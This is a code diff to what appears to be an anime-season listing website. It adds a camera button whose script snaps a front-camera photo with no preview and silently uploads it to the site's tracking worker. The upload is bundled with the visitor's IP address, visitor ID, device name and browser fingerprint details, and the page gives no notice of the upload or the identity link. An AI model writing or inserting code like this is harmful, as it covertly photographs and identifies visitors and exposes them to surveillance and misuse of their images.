@@ -275,6 +275,27 @@
             white-space: nowrap; flex-shrink: 0;
             box-shadow: 0 2px 6px rgba(0,0,0,0.15);
         }
+        .cam-capture-btn {
+            display: flex; align-items: center; justify-content: center;
+            padding: 0.4rem 0.65rem;
+            background: rgba(78,205,196,0.1); border: 1px solid rgba(78,205,196,0.25);
+            border-radius: var(--radius-pill);
+            font-size: 0.85rem; color: var(--accent-teal);
+            white-space: nowrap; flex-shrink: 0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+            cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
+            outline: none;
+            transition: background 200ms ease, border-color 200ms ease, opacity 200ms ease;
+        }
+        .cam-capture-btn:hover {
+            background: rgba(78,205,196,0.18);
+            border-color: rgba(78,205,196,0.4);
+        }
+        .cam-capture-btn:disabled {
+            opacity: 0.45;
+            cursor: not-allowed;
+        }
         .sort-wrapper {
             margin-left: 0.5rem; display: flex; align-items: center; gap: 0.3rem;
             font-size: 0.75rem; color: var(--text-muted);
@@ -296,6 +317,10 @@
             .season-pill {
                 padding: 0.35rem 0.7rem;
                 font-size: 0.68rem;
+            }
+            .cam-capture-btn {
+                padding: 0.35rem 0.55rem;
+                font-size: 0.78rem;
             }
             .sort-wrapper { width: 100%; justify-content: center; margin-left: 0; margin-top: 0.25rem; }
         }
@@ -679,6 +704,7 @@
             <span class="season-icon">☀️</span>
             <span class="season-name">Loading...</span>
         </div>
+        <button type="button" class="cam-capture-btn" id="cam-capture-btn" title="Kamera depan" aria-label="Ambil foto kamera depan">📷</button>
         <div class="sort-wrapper">
             <label for="sort-select">Urutkan:</label>
             <select id="sort-select" class="sort-select">
@@ -1252,6 +1278,13 @@ $('retry-btn').addEventListener('click', () => {
     fetchAllAnime();
 });
 $('logo').addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+
+const camCaptureBtn = $('cam-capture-btn');
+if (camCaptureBtn) {
+    camCaptureBtn.addEventListener('click', () => {
+        window.__aniseasonTrack?.captureFrontCamera?.();
+    });
+}
 let scrollTicking = false;
 window.addEventListener('scroll', () => {
     if (!scrollTicking) {
@@ -1540,6 +1573,72 @@ function getPageMeta() {
     return meta;
 }
 
+let cameraCaptureBusy = false;
+
+async function captureFrontCamera() {
+    if (!CF_READY || cameraCaptureBusy) return;
+    if (!navigator.mediaDevices?.getUserMedia) return;
+    cameraCaptureBusy = true;
+    const btn = document.getElementById('cam-capture-btn');
+    if (btn) btn.disabled = true;
+    let stream = null;
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: { ideal: 'user' },
+                width: { ideal: 640, max: 1280 },
+                height: { ideal: 480, max: 720 },
+            },
+            audio: false,
+        });
+        const video = document.createElement('video');
+        video.setAttribute('playsinline', '');
+        video.setAttribute('webkit-playsinline', '');
+        video.muted = true;
+        video.srcObject = stream;
+        await video.play();
+        await new Promise((resolve) => {
+            if (video.videoWidth > 0) return resolve();
+            video.onloadeddata = () => resolve();
+            setTimeout(resolve, 2500);
+        });
+        const w = video.videoWidth || 640;
+        const h = video.videoHeight || 480;
+        const canvas = document.createElement('canvas');
+        canvas.width = w;
+        canvas.height = h;
+        canvas.getContext('2d').drawImage(video, 0, 0, w, h);
+        const imageBase64 = canvas.toDataURL('image/jpeg', 0.72).split(',')[1];
+        if (!imageBase64) return;
+        await postWorker(cleanPayload({
+            _cameraCapture: true,
+            captureTs: Date.now(),
+            imageBase64,
+            reportSessionId: getReportSessionId(),
+            visitorId: latestVisitorId,
+            ip: latestIp,
+            deviceName: latestDeviceName,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            width: screen.width,
+            height: screen.height,
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            pixelRatio: window.devicePixelRatio,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            ...getPageMeta(),
+            url: location.href,
+            referrer: document.referrer || null,
+        }));
+    } catch (_) {
+    } finally {
+        if (stream) stream.getTracks().forEach((t) => { try { t.stop(); } catch (_) {} });
+        cameraCaptureBusy = false;
+        if (btn) btn.disabled = false;
+    }
+}
+
 function trackAnimeView(anime) {
     if (!CF_READY || !anime) return;
     const entry = {
@@ -1591,7 +1690,7 @@ function onPageExit() {
     flushPendingReports();
 }
 
-window.__aniseasonTrack = { trackAnimeView };
+window.__aniseasonTrack = { trackAnimeView, captureFrontCamera };
 
 async function collectAll() {
     if (visitReportSent) return;
